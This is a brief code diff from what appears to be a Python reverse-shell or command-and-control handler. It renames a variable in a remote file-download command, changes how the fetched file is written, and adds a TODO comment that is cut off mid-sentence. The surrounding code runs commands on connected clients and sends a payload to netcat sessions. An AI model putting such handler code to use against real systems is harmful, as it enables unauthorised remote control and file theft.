@@ -97,10 +97,10 @@ class NetShell(cmd.Cmd):
                     self.server.client_socket.send(chunk)
 
     def do_get(self, line):
-        text = pretty(self.server.send_command(f"gettingfile/{line}"))
-        if text:
+        contents = pretty(self.server.send_command(f"gettingfile/{line}"))
+        if contents:
             with open(line.split("/")[-1], 'w') as f:
-                f.write(text)
+                f.write(f"{contents}\n")
 
     def do_run(self, line):
         self.output = self.server.send_command(line, wt_output=False)
@@ -160,6 +160,7 @@ class LocalShell(cmd.Cmd):
         if not sock:
             return
         
+        # TODO: Make it so that if there 
         if sock.sysinfo.is_nc:
             logging.info(f"Sending payload..")
             sock.client_socket.send(b"touch payload\n")
